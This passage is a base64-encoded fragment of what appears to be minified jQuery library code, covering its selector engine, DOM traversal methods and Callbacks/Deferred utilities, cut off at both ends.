dICYmIChlID0gdmIoZSwgZikpLCBoYihmdW5jdGlvbiAoZiwgZywgaCwgaSkgeyB2YXIgaiwgaywgbCwgbSA9IFtdLCBuID0gW10sIG8gPSBnLmxlbmd0aCwgcCA9IGYgfHwgdGIoYiB8fCAiKiIsIGgubm9kZVR5cGUgPyBbaF0gOiBoLCBbXSksIHEgPSAhYSB8fCAhZiAmJiBiID8gcCA6IHViKHAsIG0sIGEsIGgsIGkpLCByID0gYyA/IGUgfHwgKGYgPyBhIDogbyB8fCBkKSA/IFtdIDogZyA6IHE7IGlmIChjICYmIGMocSwgciwgaCwgaSksIGQpIHsgaiA9IHViKHIsIG4pLCBkKGosIFtdLCBoLCBpKSwgayA9IGoubGVuZ3RoOyB3aGlsZSAoay0tKSAobCA9IGpba10pICYmIChyW25ba11dID0gIShxW25ba11dID0gbCkpIH0gaWYgKGYpIHsgaWYgKGUgfHwgYSkgeyBpZiAoZSkgeyBqID0gW10sIGsgPSByLmxlbmd0aDsgd2hpbGUgKGstLSkgKGwgPSByW2tdKSAmJiBqLnB1c2gocVtrXSA9IGwpOyBlKG51bGwsIHIgPSBbXSwgaiwgaSkgfSBrID0gci5sZW5ndGg7IHdoaWxlIChrLS0pIChsID0gcltrXSkgJiYgKGogPSBlID8gSy5jYWxsKGYsIGwpIDogbVtrXSkgPiAtMSAmJiAoZltqXSA9ICEoZ1tqXSA9IGwpKSB9IH0gZWxzZSByID0gdWIociA9PT0gZyA/IHIuc3BsaWNlKG8sIHIubGVuZ3RoKSA6IHIpLCBlID8gZShudWxsLCBnLCByLCBpKSA6IEkuYXBwbHkoZywgcikgfSkgfSBmdW5jdGlvbiB3YihhKSB7IGZvciAodmFyIGIsIGMsIGUsIGYgPSBhLmxlbmd0aCwgZyA9IGQucmVsYXRpdmVbYVswXS50eXBlXSwgaCA9IGcgfHwgZC5yZWxhdGl2ZVsiICJdLCBpID0gZyA/IDEgOiAwLCBrID0gcmIoZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGEgPT09IGIgfSwgaCwgITApLCBsID0gcmIoZnVuY3Rpb24gKGEpIHsgcmV0dXJuIEsuY2FsbChiLCBhKSA+IC0xIH0sIGgsICEwKSwgbSA9IFtmdW5jdGlvbiAoYSwgYywgZCkgeyByZXR1cm4gIWcgJiYgKGQgfHwgYyAhPT0gaikgfHwgKChiID0gYykubm9kZVR5cGUgPyBrKGEsIGMsIGQpIDogbChhLCBjLCBkKSkgfV07IGYgPiBpOyBpKyspIGlmIChjID0gZC5yZWxhdGl2ZVthW2ldLnR5cGVdKSBtID0gW3JiKHNiKG0pLCBjKV07IGVsc2UgeyBpZiAoYyA9IGQuZmlsdGVyW2FbaV0udHlwZV0uYXBwbHkobnVsbCwgYVtpXS5tYXRjaGVzKSwgY1t1XSkgeyBmb3IgKGUgPSArK2k7IGYgPiBlOyBlKyspIGlmIChkLnJlbGF0aXZlW2FbZV0udHlwZV0pIGJyZWFrOyByZXR1cm4gdmIoaSA+IDEgJiYgc2IobSksIGkgPiAxICYmIHFiKGEuc2xpY2UoMCwgaSAtIDEpLmNvbmNhdCh7IHZhbHVlOiAiICIgPT09IGFbaSAtIDJdLnR5cGUgPyAiKiIgOiAiIiB9KSkucmVwbGFjZShSLCAiJDEiKSwgYywgZSA+IGkgJiYgd2IoYS5zbGljZShpLCBlKSksIGYgPiBlICYmIHdiKGEgPSBhLnNsaWNlKGUpKSwgZiA+IGUgJiYgcWIoYSkpIH0gbS5wdXNoKGMpIH0gcmV0dXJuIHNiKG0pIH0gZnVuY3Rpb24geGIoYSwgYikgeyB2YXIgYyA9IGIubGVuZ3RoID4gMCwgZSA9IGEubGVuZ3RoID4gMCwgZiA9IGZ1bmN0aW9uIChmLCBnLCBoLCBpLCBrKSB7IHZhciBsLCBtLCBvLCBwID0gMCwgcSA9ICIwIiwgciA9IGYgJiYgW10sIHMgPSBbXSwgdCA9IGosIHUgPSBmIHx8IGUgJiYgZC5maW5kLlRBRygiKiIsIGspLCB2ID0gdyArPSBudWxsID09IHQgPyAxIDogTWF0aC5yYW5kb20oKSB8fCAuMSwgeCA9IHUubGVuZ3RoOyBmb3IgKGsgJiYgKGogPSBnICE9PSBuICYmIGcpIDsgcSAhPT0geCAmJiBudWxsICE9IChsID0gdVtxXSkgOyBxKyspIHsgaWYgKGUgJiYgbCkgeyBtID0gMDsgd2hpbGUgKG8gPSBhW20rK10pIGlmIChvKGwsIGcsIGgpKSB7IGkucHVzaChsKTsgYnJlYWsgfSBrICYmICh3ID0gdikgfSBjICYmICgobCA9ICFvICYmIGwpICYmIHAtLSwgZiAmJiByLnB1c2gobCkpIH0gaWYgKHAgKz0gcSwgYyAmJiBxICE9PSBwKSB7IG0gPSAwOyB3aGlsZSAobyA9IGJbbSsrXSkgbyhyLCBzLCBnLCBoKTsgaWYgKGYpIHsgaWYgKHAgPiAwKSB3aGlsZSAocS0tKSByW3FdIHx8IHNbcV0gfHwgKHNbcV0gPSBHLmNhbGwoaSkpOyBzID0gdWIocykgfSBJLmFwcGx5KGksIHMpLCBrICYmICFmICYmIHMubGVuZ3RoID4gMCAmJiBwICsgYi5sZW5ndGggPiAxICYmIGZiLnVuaXF1ZVNvcnQoaSkgfSByZXR1cm4gayAmJiAodyA9IHYsIGogPSB0KSwgciB9OyByZXR1cm4gYyA/IGhiKGYpIDogZiB9IHJldHVybiBoID0gZmIuY29tcGlsZSA9IGZ1bmN0aW9uIChhLCBiKSB7IHZhciBjLCBkID0gW10sIGUgPSBbXSwgZiA9IEFbYSArICIgIl07IGlmICghZikgeyBiIHx8IChiID0gZyhhKSksIGMgPSBiLmxlbmd0aDsgd2hpbGUgKGMtLSkgZiA9IHdiKGJbY10pLCBmW3VdID8gZC5wdXNoKGYpIDogZS5wdXNoKGYpOyBmID0gQShhLCB4YihlLCBkKSksIGYuc2VsZWN0b3IgPSBhIH0gcmV0dXJuIGYgfSwgaSA9IGZiLnNlbGVjdCA9IGZ1bmN0aW9uIChhLCBiLCBlLCBmKSB7IHZhciBpLCBqLCBrLCBsLCBtLCBuID0gImZ1bmN0aW9uIiA9PSB0eXBlb2YgYSAmJiBhLCBvID0gIWYgJiYgZyhhID0gbi5zZWxlY3RvciB8fCBhKTsgaWYgKGUgPSBlIHx8IFtdLCAxID09PSBvLmxlbmd0aCkgeyBpZiAoaiA9IG9bMF0gPSBvWzBdLnNsaWNlKDApLCBqLmxlbmd0aCA+IDIgJiYgIklEIiA9PT0gKGsgPSBqWzBdKS50eXBlICYmIGMuZ2V0QnlJZCAmJiA5ID09PSBiLm5vZGVUeXBlICYmIHAgJiYgZC5yZWxhdGl2ZVtqWzFdLnR5cGVdKSB7IGlmIChiID0gKGQuZmluZC5JRChrLm1hdGNoZXNbMF0ucmVwbGFjZShjYiwgZGIpLCBiKSB8fCBbXSlbMF0sICFiKSByZXR1cm4gZTsgbiAmJiAoYiA9IGIucGFyZW50Tm9kZSksIGEgPSBhLnNsaWNlKGouc2hpZnQoKS52YWx1ZS5sZW5ndGgpIH0gaSA9IFgubmVlZHNDb250ZXh0LnRlc3QoYSkgPyAwIDogai5sZW5ndGg7IHdoaWxlIChpLS0pIHsgaWYgKGsgPSBqW2ldLCBkLnJlbGF0aXZlW2wgPSBrLnR5cGVdKSBicmVhazsgaWYgKChtID0gZC5maW5kW2xdKSAmJiAoZiA9IG0oay5tYXRjaGVzWzBdLnJlcGxhY2UoY2IsIGRiKSwgYWIudGVzdChqWzBdLnR5cGUpICYmIG9iKGIucGFyZW50Tm9kZSkgfHwgYikpKSB7IGlmIChqLnNwbGljZShpLCAxKSwgYSA9IGYubGVuZ3RoICYmIHFiKGopLCAhYSkgcmV0dXJuIEkuYXBwbHkoZSwgZiksIGU7IGJyZWFrIH0gfSB9IHJldHVybiAobiB8fCBoKGEsIG8pKShmLCBiLCAhcCwgZSwgYWIudGVzdChhKSAmJiBvYihiLnBhcmVudE5vZGUpIHx8IGIpLCBlIH0sIGMuc29ydFN0YWJsZSA9IHUuc3BsaXQoIiIpLnNvcnQoQikuam9pbigiIikgPT09IHUsIGMuZGV0ZWN0RHVwbGljYXRlcyA9ICEhbCwgbSgpLCBjLnNvcnREZXRhY2hlZCA9IGliKGZ1bmN0aW9uIChhKSB7IHJldHVybiAxICYgYS5jb21wYXJlRG9jdW1lbnRQb3NpdGlvbihuLmNyZWF0ZUVsZW1lbnQoImRpdiIpKSB9KSwgaWIoZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGEuaW5uZXJIVE1MID0gIjxhIGhyZWY9JyMnPjwvYT4iLCAiIyIgPT09IGEuZmlyc3RDaGlsZC5nZXRBdHRyaWJ1dGUoImhyZWYiKSB9KSB8fCBqYigidHlwZXxocmVmfGhlaWdodHx3aWR0aCIsIGZ1bmN0aW9uIChhLCBiLCBjKSB7IHJldHVybiBjID8gdm9pZCAwIDogYS5nZXRBdHRyaWJ1dGUoYiwgInR5cGUiID09PSBiLnRvTG93ZXJDYXNlKCkgPyAxIDogMikgfSksIGMuYXR0cmlidXRlcyAmJiBpYihmdW5jdGlvbiAoYSkgeyByZXR1cm4gYS5pbm5lckhUTUwgPSAiPGlucHV0Lz4iLCBhLmZpcnN0Q2hpbGQuc2V0QXR0cmlidXRlKCJ2YWx1ZSIsICIiKSwgIiIgPT09IGEuZmlyc3RDaGlsZC5nZXRBdHRyaWJ1dGUoInZhbHVlIikgfSkgfHwgamIoInZhbHVlIiwgZnVuY3Rpb24gKGEsIGIsIGMpIHsgcmV0dXJuIGMgfHwgImlucHV0IiAhPT0gYS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID8gdm9pZCAwIDogYS5kZWZhdWx0VmFsdWUgfSksIGliKGZ1bmN0aW9uIChhKSB7IHJldHVybiBudWxsID09IGEuZ2V0QXR0cmlidXRlKCJkaXNhYmxlZCIpIH0pIHx8IGpiKEwsIGZ1bmN0aW9uIChhLCBiLCBjKSB7IHZhciBkOyByZXR1cm4gYyA/IHZvaWQgMCA6IGFbYl0gPT09ICEwID8gYi50b0xvd2VyQ2FzZSgpIDogKGQgPSBhLmdldEF0dHJpYnV0ZU5vZGUoYikpICYmIGQuc3BlY2lmaWVkID8gZC52YWx1ZSA6IG51bGwgfSksIGZiIH0oYSk7IG0uZmluZCA9IHMsIG0uZXhwciA9IHMuc2VsZWN0b3JzLCBtLmV4cHJbIjoiXSA9IG0uZXhwci5wc2V1ZG9zLCBtLnVuaXF1ZSA9IHMudW5pcXVlU29ydCwgbS50ZXh0ID0gcy5nZXRUZXh0LCBtLmlzWE1MRG9jID0gcy5pc1hNTCwgbS5jb250YWlucyA9IHMuY29udGFpbnM7IHZhciB0ID0gbS5leHByLm1hdGNoLm5lZWRzQ29udGV4dCwgdSA9IC9ePChcdyspXHMqXC8/Pig/OjxcL1wxPnwpJC8sIHYgPSAvXi5bXjojXFtcLixdKiQvOyBmdW5jdGlvbiB3KGEsIGIsIGMpIHsgaWYgKG0uaXNGdW5jdGlvbihiKSkgcmV0dXJuIG0uZ3JlcChhLCBmdW5jdGlvbiAoYSwgZCkgeyByZXR1cm4gISFiLmNhbGwoYSwgZCwgYSkgIT09IGMgfSk7IGlmIChiLm5vZGVUeXBlKSByZXR1cm4gbS5ncmVwKGEsIGZ1bmN0aW9uIChhKSB7IHJldHVybiBhID09PSBiICE9PSBjIH0pOyBpZiAoInN0cmluZyIgPT0gdHlwZW9mIGIpIHsgaWYgKHYudGVzdChiKSkgcmV0dXJuIG0uZmlsdGVyKGIsIGEsIGMpOyBiID0gbS5maWx0ZXIoYiwgYSkgfSByZXR1cm4gbS5ncmVwKGEsIGZ1bmN0aW9uIChhKSB7IHJldHVybiBtLmluQXJyYXkoYSwgYikgPj0gMCAhPT0gYyB9KSB9IG0uZmlsdGVyID0gZnVuY3Rpb24gKGEsIGIsIGMpIHsgdmFyIGQgPSBiWzBdOyByZXR1cm4gYyAmJiAoYSA9ICI6bm90KCIgKyBhICsgIikiKSwgMSA9PT0gYi5sZW5ndGggJiYgMSA9PT0gZC5ub2RlVHlwZSA/IG0uZmluZC5tYXRjaGVzU2VsZWN0b3IoZCwgYSkgPyBbZF0gOiBbXSA6IG0uZmluZC5tYXRjaGVzKGEsIG0uZ3JlcChiLCBmdW5jdGlvbiAoYSkgeyByZXR1cm4gMSA9PT0gYS5ub2RlVHlwZSB9KSkgfSwgbS5mbi5leHRlbmQoeyBmaW5kOiBmdW5jdGlvbiAoYSkgeyB2YXIgYiwgYyA9IFtdLCBkID0gdGhpcywgZSA9IGQubGVuZ3RoOyBpZiAoInN0cmluZyIgIT0gdHlwZW9mIGEpIHJldHVybiB0aGlzLnB1c2hTdGFjayhtKGEpLmZpbHRlcihmdW5jdGlvbiAoKSB7IGZvciAoYiA9IDA7IGUgPiBiOyBiKyspIGlmIChtLmNvbnRhaW5zKGRbYl0sIHRoaXMpKSByZXR1cm4gITAgfSkpOyBmb3IgKGIgPSAwOyBlID4gYjsgYisrKSBtLmZpbmQoYSwgZFtiXSwgYyk7IHJldHVybiBjID0gdGhpcy5wdXNoU3RhY2soZSA+IDEgPyBtLnVuaXF1ZShjKSA6IGMpLCBjLnNlbGVjdG9yID0gdGhpcy5zZWxlY3RvciA/IHRoaXMuc2VsZWN0b3IgKyAiICIgKyBhIDogYSwgYyB9LCBmaWx0ZXI6IGZ1bmN0aW9uIChhKSB7IHJldHVybiB0aGlzLnB1c2hTdGFjayh3KHRoaXMsIGEgfHwgW10sICExKSkgfSwgbm90OiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gdGhpcy5wdXNoU3RhY2sodyh0aGlzLCBhIHx8IFtdLCAhMCkpIH0sIGlzOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gISF3KHRoaXMsICJzdHJpbmciID09IHR5cGVvZiBhICYmIHQudGVzdChhKSA/IG0oYSkgOiBhIHx8IFtdLCAhMSkubGVuZ3RoIH0gfSk7IHZhciB4LCB5ID0gYS5kb2N1bWVudCwgeiA9IC9eKD86XHMqKDxbXHdcV10rPilbXj5dKnwjKFtcdy1dKikpJC8sIEEgPSBtLmZuLmluaXQgPSBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYywgZDsgaWYgKCFhKSByZXR1cm4gdGhpczsgaWYgKCJzdHJpbmciID09IHR5cGVvZiBhKSB7IGlmIChjID0gIjwiID09PSBhLmNoYXJBdCgwKSAmJiAiPiIgPT09IGEuY2hhckF0KGEubGVuZ3RoIC0gMSkgJiYgYS5sZW5ndGggPj0gMyA/IFtudWxsLCBhLCBudWxsXSA6IHouZXhlYyhhKSwgIWMgfHwgIWNbMV0gJiYgYikgcmV0dXJuICFiIHx8IGIuanF1ZXJ5ID8gKGIgfHwgeCkuZmluZChhKSA6IHRoaXMuY29uc3RydWN0b3IoYikuZmluZChhKTsgaWYgKGNbMV0pIHsgaWYgKGIgPSBiIGluc3RhbmNlb2YgbSA/IGJbMF0gOiBiLCBtLm1lcmdlKHRoaXMsIG0ucGFyc2VIVE1MKGNbMV0sIGIgJiYgYi5ub2RlVHlwZSA/IGIub3duZXJEb2N1bWVudCB8fCBiIDogeSwgITApKSwgdS50ZXN0KGNbMV0pICYmIG0uaXNQbGFpbk9iamVjdChiKSkgZm9yIChjIGluIGIpIG0uaXNGdW5jdGlvbih0aGlzW2NdKSA/IHRoaXNbY10oYltjXSkgOiB0aGlzLmF0dHIoYywgYltjXSk7IHJldHVybiB0aGlzIH0gaWYgKGQgPSB5LmdldEVsZW1lbnRCeUlkKGNbMl0pLCBkICYmIGQucGFyZW50Tm9kZSkgeyBpZiAoZC5pZCAhPT0gY1syXSkgcmV0dXJuIHguZmluZChhKTsgdGhpcy5sZW5ndGggPSAxLCB0aGlzWzBdID0gZCB9IHJldHVybiB0aGlzLmNvbnRleHQgPSB5LCB0aGlzLnNlbGVjdG9yID0gYSwgdGhpcyB9IHJldHVybiBhLm5vZGVUeXBlID8gKHRoaXMuY29udGV4dCA9IHRoaXNbMF0gPSBhLCB0aGlzLmxlbmd0aCA9IDEsIHRoaXMpIDogbS5pc0Z1bmN0aW9uKGEpID8gInVuZGVmaW5lZCIgIT0gdHlwZW9mIHgucmVhZHkgPyB4LnJlYWR5KGEpIDogYShtKSA6ICh2b2lkIDAgIT09IGEuc2VsZWN0b3IgJiYgKHRoaXMuc2VsZWN0b3IgPSBhLnNlbGVjdG9yLCB0aGlzLmNvbnRleHQgPSBhLmNvbnRleHQpLCBtLm1ha2VBcnJheShhLCB0aGlzKSkgfTsgQS5wcm90b3R5cGUgPSBtLmZuLCB4ID0gbSh5KTsgdmFyIEIgPSAvXig/OnBhcmVudHN8cHJldig/OlVudGlsfEFsbCkpLywgQyA9IHsgY2hpbGRyZW46ICEwLCBjb250ZW50czogITAsIG5leHQ6ICEwLCBwcmV2OiAhMCB9OyBtLmV4dGVuZCh7IGRpcjogZnVuY3Rpb24gKGEsIGIsIGMpIHsgdmFyIGQgPSBbXSwgZSA9IGFbYl07IHdoaWxlIChlICYmIDkgIT09IGUubm9kZVR5cGUgJiYgKHZvaWQgMCA9PT0gYyB8fCAxICE9PSBlLm5vZGVUeXBlIHx8ICFtKGUpLmlzKGMpKSkgMSA9PT0gZS5ub2RlVHlwZSAmJiBkLnB1c2goZSksIGUgPSBlW2JdOyByZXR1cm4gZCB9LCBzaWJsaW5nOiBmdW5jdGlvbiAoYSwgYikgeyBmb3IgKHZhciBjID0gW107IGE7IGEgPSBhLm5leHRTaWJsaW5nKSAxID09PSBhLm5vZGVUeXBlICYmIGEgIT09IGIgJiYgYy5wdXNoKGEpOyByZXR1cm4gYyB9IH0pLCBtLmZuLmV4dGVuZCh7IGhhczogZnVuY3Rpb24gKGEpIHsgdmFyIGIsIGMgPSBtKGEsIHRoaXMpLCBkID0gYy5sZW5ndGg7IHJldHVybiB0aGlzLmZpbHRlcihmdW5jdGlvbiAoKSB7IGZvciAoYiA9IDA7IGQgPiBiOyBiKyspIGlmIChtLmNvbnRhaW5zKHRoaXMsIGNbYl0pKSByZXR1cm4gITAgfSkgfSwgY2xvc2VzdDogZnVuY3Rpb24gKGEsIGIpIHsgZm9yICh2YXIgYywgZCA9IDAsIGUgPSB0aGlzLmxlbmd0aCwgZiA9IFtdLCBnID0gdC50ZXN0KGEpIHx8ICJzdHJpbmciICE9IHR5cGVvZiBhID8gbShhLCBiIHx8IHRoaXMuY29udGV4dCkgOiAwOyBlID4gZDsgZCsrKSBmb3IgKGMgPSB0aGlzW2RdOyBjICYmIGMgIT09IGI7IGMgPSBjLnBhcmVudE5vZGUpIGlmIChjLm5vZGVUeXBlIDwgMTEgJiYgKGcgPyBnLmluZGV4KGMpID4gLTEgOiAxID09PSBjLm5vZGVUeXBlICYmIG0uZmluZC5tYXRjaGVzU2VsZWN0b3IoYywgYSkpKSB7IGYucHVzaChjKTsgYnJlYWsgfSByZXR1cm4gdGhpcy5wdXNoU3RhY2soZi5sZW5ndGggPiAxID8gbS51bmlxdWUoZikgOiBmKSB9LCBpbmRleDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGEgPyAic3RyaW5nIiA9PSB0eXBlb2YgYSA/IG0uaW5BcnJheSh0aGlzWzBdLCBtKGEpKSA6IG0uaW5BcnJheShhLmpxdWVyeSA/IGFbMF0gOiBhLCB0aGlzKSA6IHRoaXNbMF0gJiYgdGhpc1swXS5wYXJlbnROb2RlID8gdGhpcy5maXJzdCgpLnByZXZBbGwoKS5sZW5ndGggOiAtMSB9LCBhZGQ6IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiB0aGlzLnB1c2hTdGFjayhtLnVuaXF1ZShtLm1lcmdlKHRoaXMuZ2V0KCksIG0oYSwgYikpKSkgfSwgYWRkQmFjazogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIHRoaXMuYWRkKG51bGwgPT0gYSA/IHRoaXMucHJldk9iamVjdCA6IHRoaXMucHJldk9iamVjdC5maWx0ZXIoYSkpIH0gfSk7IGZ1bmN0aW9uIEQoYSwgYikgeyBkbyBhID0gYVtiXTsgd2hpbGUgKGEgJiYgMSAhPT0gYS5ub2RlVHlwZSk7IHJldHVybiBhIH0gbS5lYWNoKHsgcGFyZW50OiBmdW5jdGlvbiAoYSkgeyB2YXIgYiA9IGEucGFyZW50Tm9kZTsgcmV0dXJuIGIgJiYgMTEgIT09IGIubm9kZVR5cGUgPyBiIDogbnVsbCB9LCBwYXJlbnRzOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gbS5kaXIoYSwgInBhcmVudE5vZGUiKSB9LCBwYXJlbnRzVW50aWw6IGZ1bmN0aW9uIChhLCBiLCBjKSB7IHJldHVybiBtLmRpcihhLCAicGFyZW50Tm9kZSIsIGMpIH0sIG5leHQ6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBEKGEsICJuZXh0U2libGluZyIpIH0sIHByZXY6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBEKGEsICJwcmV2aW91c1NpYmxpbmciKSB9LCBuZXh0QWxsOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gbS5kaXIoYSwgIm5leHRTaWJsaW5nIikgfSwgcHJldkFsbDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIG0uZGlyKGEsICJwcmV2aW91c1NpYmxpbmciKSB9LCBuZXh0VW50aWw6IGZ1bmN0aW9uIChhLCBiLCBjKSB7IHJldHVybiBtLmRpcihhLCAibmV4dFNpYmxpbmciLCBjKSB9LCBwcmV2VW50aWw6IGZ1bmN0aW9uIChhLCBiLCBjKSB7IHJldHVybiBtLmRpcihhLCAicHJldmlvdXNTaWJsaW5nIiwgYykgfSwgc2libGluZ3M6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBtLnNpYmxpbmcoKGEucGFyZW50Tm9kZSB8fCB7fSkuZmlyc3RDaGlsZCwgYSkgfSwgY2hpbGRyZW46IGZ1bmN0aW9uIChhKSB7IHJldHVybiBtLnNpYmxpbmcoYS5maXJzdENoaWxkKSB9LCBjb250ZW50czogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIG0ubm9kZU5hbWUoYSwgImlmcmFtZSIpID8gYS5jb250ZW50RG9jdW1lbnQgfHwgYS5jb250ZW50V2luZG93LmRvY3VtZW50IDogbS5tZXJnZShbXSwgYS5jaGlsZE5vZGVzKSB9IH0sIGZ1bmN0aW9uIChhLCBiKSB7IG0uZm5bYV0gPSBmdW5jdGlvbiAoYywgZCkgeyB2YXIgZSA9IG0ubWFwKHRoaXMsIGIsIGMpOyByZXR1cm4gIlVudGlsIiAhPT0gYS5zbGljZSgtNSkgJiYgKGQgPSBjKSwgZCAmJiAic3RyaW5nIiA9PSB0eXBlb2YgZCAmJiAoZSA9IG0uZmlsdGVyKGQsIGUpKSwgdGhpcy5sZW5ndGggPiAxICYmIChDW2FdIHx8IChlID0gbS51bmlxdWUoZSkpLCBCLnRlc3QoYSkgJiYgKGUgPSBlLnJldmVyc2UoKSkpLCB0aGlzLnB1c2hTdGFjayhlKSB9IH0pOyB2YXIgRSA9IC9cUysvZywgRiA9IHt9OyBmdW5jdGlvbiBHKGEpIHsgdmFyIGIgPSBGW2FdID0ge307IHJldHVybiBtLmVhY2goYS5tYXRjaChFKSB8fCBbXSwgZnVuY3Rpb24gKGEsIGMpIHsgYltjXSA9ICEwIH0pLCBiIH0gbS5DYWxsYmFja3MgPSBmdW5jdGlvbiAoYSkgeyBhID0gInN0cmluZyIgPT0gdHlwZW9mIGEgPyBGW2FdIHx8IEcoYSkgOiBtLmV4dGVuZCh7fSwgYSk7IHZhciBiLCBjLCBkLCBlLCBmLCBnLCBoID0gW10sIGkgPSAhYS5vbmNlICYmIFtdLCBqID0gZnVuY3Rpb24gKGwpIHsgZm9yIChjID0gYS5tZW1vcnkgJiYgbCwgZCA9ICEwLCBmID0gZyB8fCAwLCBnID0gMCwgZSA9IGgubGVuZ3RoLCBiID0gITA7IGggJiYgZSA+IGY7IGYrKykgaWYgKGhbZl0uYXBwbHkobFswXSwgbFsxXSkgPT09ICExICYmIGEuc3RvcE9uRmFsc2UpIHsgYyA9ICExOyBicmVhayB9IGIgPSAhMSwgaCAmJiAoaSA/IGkubGVuZ3RoICYmIGooaS5zaGlmdCgpKSA6IGMgPyBoID0gW10gOiBrLmRpc2FibGUoKSkgfSwgayA9IHsgYWRkOiBmdW5jdGlvbiAoKSB7IGlmIChoKSB7IHZhciBkID0gaC5sZW5ndGg7ICFmdW5jdGlvbiBmKGIpIHsgbS5lYWNoKGIsIGZ1bmN0aW9uIChiLCBjKSB7IHZhciBkID0gbS50eXBlKGMpOyAiZnVuY3Rpb24iID09PSBkID8gYS51bmlxdWUgJiYgay5oYXMoYykgfHwgaC5wdXNoKGMpIDogYyAmJiBjLmxlbmd0aCAmJiAic3RyaW5nIiAhPT0gZCAmJiBmKGMpIH0pIH0oYXJndW1lbnRzKSwgYiA/IGUgPSBoLmxlbmd0aCA6IGMgJiYgKGcgPSBkLCBqKGMpKSB9IHJldHVybiB0aGlzIH0sIHJlbW92ZTogZnVuY3Rpb24gKCkgeyByZXR1cm4gaCAmJiBtLmVhY2goYXJndW1lbnRzLCBmdW5jdGlvbiAoYSwgYykgeyB2YXIgZDsgd2hpbGUgKChkID0gbS5pbkFycmF5KGMsIGgsIGQpKSA+IC0xKSBoLnNwbGljZShkLCAxKSwgYiAmJiAoZSA+PSBkICYmIGUtLSwgZiA+PSBkICYmIGYtLSkgfSksIHRoaXMgfSwgaGFzOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gYSA/IG0uaW5BcnJheShhLCBoKSA+IC0xIDogISghaCB8fCAhaC5sZW5ndGgpIH0sIGVtcHR5OiBmdW5jdGlvbiAoKSB7IHJldHVybiBoID0gW10sIGUgPSAwLCB0aGlzIH0sIGRpc2FibGU6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIGggPSBpID0gYyA9IHZvaWQgMCwgdGhpcyB9LCBkaXNhYmxlZDogZnVuY3Rpb24gKCkgeyByZXR1cm4gIWggfSwgbG9jazogZnVuY3Rpb24gKCkgeyByZXR1cm4gaSA9IHZvaWQgMCwgYyB8fCBrLmRpc2FibGUoKSwgdGhpcyB9LCBsb2NrZWQ6IGZ1bmN0aW9uICgpIHsgcmV0dXJuICFpIH0sIGZpcmVXaXRoOiBmdW5jdGlvbiAoYSwgYykgeyByZXR1cm4gIWggfHwgZCAmJiAhaSB8fCAoYyA9IGMgfHwgW10sIGMgPSBbYSwgYy5zbGljZSA/IGMuc2xpY2UoKSA6IGNdLCBiID8gaS5wdXNoKGMpIDogaihjKSksIHRoaXMgfSwgZmlyZTogZnVuY3Rpb24gKCkgeyByZXR1cm4gay5maXJlV2l0aCh0aGlzLCBhcmd1bWVudHMpLCB0aGlzIH0sIGZpcmVkOiBmdW5jdGlvbiAoKSB7IHJldHVybiAhIWQgfSB9OyByZXR1cm4gayB9LCBtLmV4dGVuZCh7IERlZmVycmVkOiBmdW5jdGlvbiAoYSkgeyB2YXIgYiA9IFtbInJlc29sdmUiLCAiZG9uZSIsIG0uQ2FsbGJhY2tzKCJvbmNlIG1lbW9yeSIpLCAicmVzb2x2ZWQiXSwgWyJyZWplY3QiLCAiZmFpbCIsIG0uQ2FsbGJhY2tzKCJvbmNlIG1lbW9yeSIpLCAicmVqZWN0ZWQiXSwgWyJub3RpZnkiLCAicHJvZ3Jlc3MiLCBtLkNhbGxiYWNrcygibWVtb3J5IildXSwgYyA9ICJwZW5kaW5nIiwgZCA9IHsgc3RhdGU6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIGMgfSwgYWx3YXlzOiBmdW5jdGlvbiAoKSB7IHJldHVybiBlLmRvbmUoYXJndW1lbnRzKS5mYWlsKGFyZ3VtZW50cyksIHRoaXMgfSwgdGhlbjogZnVuY3Rpb24gKCkgeyB2YXIgYSA9IGFyZ3VtZW50czsgcmV0dXJuIG0uRGVmZXJyZWQoZnVuY3Rpb24gKGMpIHsgbS5lYWNoKGIsIGZ1bmN0aW9uIChiLCBmKSB7IHZhciBnID0gbS5pc0Z1bmN0aW9uKGFbYl0pICYmIGFbYl07IGVbZlsxXV0oZnVuY3Rpb24gKCkgeyB2YXIgYSA9IGcgJiYgZy5hcHBseSh0aGlzLCBhcmd1bWVudHMpOyBhICYmIG0uaXNGdW5jdGlvbihhLnByb21pc2UpID8gYS5wcm9taXNlKCkuZG9uZShjLnJlc29sdmUpLmZhaWwoYy5yZWplY3QpLnByb2dyZXNzKGMubm90aWZ5KSA6IGNbZlswXSArICJXaXRoIl0odGhpcyA9PT0gZCA/IGMucHJvbWlzZSgpIDogdGhpcywgZyA/IFthXSA6IGFyZ3VtZW50cykgfSkgfSksIGEgPSBudWxsIH0pLnByb21pc2UoKSB9LCBwcm9taXNlOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gbnVsbCAhPSBhID8gbS5leHRlbmQoYSwgZCkgOiBkIH0gfSwgZSA9IHt9OyByZXR1cm4gZC5waXBlID0gZC50aGVuLCBtLmVhY2goYiwgZnVuY3Rpb24gKGEsIGYpIHsgdmFyIGcgPSBmWzJdLCBoID0gZlszXTsgZFtmWzFdXSA9IGcuYWRkLCBoICYmIGcuYWRkKGZ1bmN0aW9uICgpIHsgYyA9IGggfSwgYlsxIF4gYV1bMl0uZGlzYWJsZSwgYlsyXVsyXS5sb2NrKSwgZVtmWzBdXSA9IGZ1bmN0aW9uICgpIHsgcmV0dXJuIGVbZlswXSArICJXaXRoIl0odGhpcyA9PT0gZSA/IGQgOiB0aGlzLCBhcmd1bWVudHMpLCB0aGlzIH0sIGVbZlswXSArICJXaXRoIl0gPSBnLmZpcmVXaXRoIH0pLCBkLnByb21pc2UoZSksIGEgJiYgYS5jYWxsKGUsIGUpLCBlIH0sIHdoZW46IGZ1bmN0a